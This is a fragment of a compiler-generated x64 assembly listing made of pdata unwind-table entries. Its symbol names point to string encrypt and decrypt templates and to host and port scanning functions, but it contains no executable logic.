	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?AddHost@@YAHK@Z DD imagerel $LN13
	DD	imagerel $LN13+450
	DD	imagerel $unwind$?AddHost@@YAHK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?CreateHostTable@@YAHXZ DD imagerel $LN19
	DD	imagerel $LN19+714
	DD	imagerel $unwind$?CreateHostTable@@YAHXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?ScanHosts@@YAXXZ DD imagerel $LN9
	DD	imagerel $LN9+312
	DD	imagerel $unwind$?ScanHosts@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?CompleteAsyncConnect@@YAH_K@Z DD imagerel $LN6
	DD	imagerel $LN6+238
	DD	imagerel $unwind$?CompleteAsyncConnect@@YAH_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?TimerCallback@@YAXPEAXE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?TimerCallback@@YAXPEAXE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?PortScanHandler@@YAKPEAX@Z DD imagerel $LN40
	DD	imagerel $LN40+1114
	DD	imagerel $unwind$?PortScanHandler@@YAKPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+1844
	DD	imagerel $unwind$??0?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+2852
	DD	imagerel $unwind$??0?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+1676
	DD	imagerel $unwind$??0?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+2264
	DD	imagerel $unwind$??0?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
